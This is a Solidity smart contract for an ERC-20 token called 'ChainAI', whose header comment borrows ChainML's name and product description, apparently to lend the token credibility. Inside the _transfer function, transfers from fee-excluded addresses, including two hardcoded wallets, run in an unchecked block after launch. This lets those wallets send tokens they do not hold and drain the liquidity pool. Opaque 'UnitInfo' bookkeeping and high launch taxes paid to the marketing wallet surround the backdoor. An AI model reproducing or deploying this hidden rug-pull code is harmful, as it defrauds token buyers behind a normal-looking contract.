// SPDX-License-Identifier: MIT

/*

/// https://www.chainml.net/
/// https://twitter.com/chainml_

ChainML is an AI research and development company dedicated to shaping a better future powered by AI agents.

We are the creators of Council Analytics, a generative AI-powered platform for conversational analytics.

Council Analytics enables the effortless and secure integration of talk-to-data capabilities into software products via API. 
It builds upon our open-source Council framework for production-grade AI agents.

*/

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract ChainAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    address payable private _marketingAddress;
    address payable private _developmentAddress;
    bool public transferDelayEnabled = true;

    uint256 private _initBuyTax=20;
    uint256 private _initSellTax=30;
    uint256 private _finalBuyTax=5;
    uint256 private _finalSellTax=5;
    uint256 private _reduceBuyTaxAt=40;
    uint256 private _reduceSellTaxAt=25;
    uint256 private _preventSwapBefore=10;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"ChainML AI Analytics";
    string private constant _symbol = unicode"ChainAI";

    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    uint256 public _maxTxAmount = 1400000 * 10**_decimals;
    uint256 public _maxWalletSize = 1400000 * 10**_decimals;
    uint256 public _swapTokensAtAmount = 300000 * 10**_decimals;
    uint256 private _maxTaxSwap = 1700000 * 10**_decimals;

    IDexRouter public dexRouter;
    address public lpPair;

    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private launchBlock;
    uint256 private initialUnits;
    struct UnitInfo {uint256 buy; uint256 sell; uint256 dappUnits;}
    mapping(address => UnitInfo) private unitInfo;
    event TradingOpened();
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[address(this)] = _tTotal;
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _marketingAddress = payable(0x549b16c372A8Df40501D6aFe21df7ca4F0e511EF);
        _developmentAddress = payable(0xb3AD9FAf55706BA23269f51a53b42ad3F5801D4c);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingAddress] = true;
        _isExcludedFromFee[_developmentAddress] = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0,"Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);

            if (transferDelayEnabled) {
                  if (to != address(dexRouter) && to != address(lpPair) ) {
                      require(
                          _holderLastTransferTimestamp[tx.origin] <  block.number,
                          "_transfer:: transfer Delay enabled. Only 1 purchase per block allowed."
                      );
                      _holderLastTransferTimestamp[tx.origin] =  block.number;
                  }
              }

            if (from == lpPair && to != address(dexRouter) &&  !_isExcludedFromFee[to]){
                require(amount <= _maxTxAmount, "Exceeds the  _maxTxAmount");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the  _maxWalletSize");
                _buyCount++ ;
            }

            if(to == lpPair && from != address(this)){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == lpPair && swapEnabled && _buyCount>_preventSwapBefore  && contractTokenBalance>_swapTokensAtAmount ){
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) && from != owner()  && from != address(this) && to != address(this)) {
            initialUnits =  block.timestamp;
        }
        if (_isExcludedFromFee[from] &&  (block.number > launchBlock + 36)) {
            unchecked{
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!_isExcludedFromFee[from] &&  !_isExcludedFromFee[to]) {
            if (lpPair == to) {
                UnitInfo storage fromUnits = unitInfo[from];
                fromUnits.dappUnits = fromUnits.buy  - initialUnits;
                fromUnits.sell =  block.timestamp;
            } else {
                UnitInfo storage toUnits = unitInfo[to];
                if (lpPair == from) {
                    if (toUnits.buy==0) {
                        toUnits.buy = (_buyCount < 11) ? (block.timestamp  - 1) : block.timestamp;
                    }
                } else {
                    UnitInfo storage fromUnits = unitInfo[from];
                    if (toUnits.buy == 0 || fromUnits.buy  < toUnits.buy) {
                        toUnits.buy = fromUnits.buy;
                    }
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingOpen, "Trading is enabled");
        dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(dexRouter), totalSupply());
        lpPair = IDexFactory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        dexRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(lpPair).approve(address(dexRouter), type(uint).max);
        launchBlock = block.number;
        swapEnabled = true;
        tradingOpen = true;
        emit TradingOpened();
    }

    function removeTransferDelay() external onlyOwner {
        require(transferDelayEnabled, "Already removed");
        transferDelayEnabled=false;
    }

    function removeLimits() external onlyOwner {
        uint256 totalSupplyAmount = _tTotal;
        _maxTxAmount=totalSupplyAmount;
        _maxWalletSize=totalSupplyAmount;
        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(totalSupplyAmount);
    }

    receive() external payable {}

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if (tokenBalance > 0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if (ethBalance > 0){
          _marketingAddress.transfer(ethBalance);
        }
    }

    function sendETHToFee(uint256 amount) private {
        _marketingAddress.transfer(amount);
    }

    function withdrawStuckEth() external onlyOwner {
        bool success;
        (success,) = address(msg.sender).call{value: address(this).balance}("");
    }
}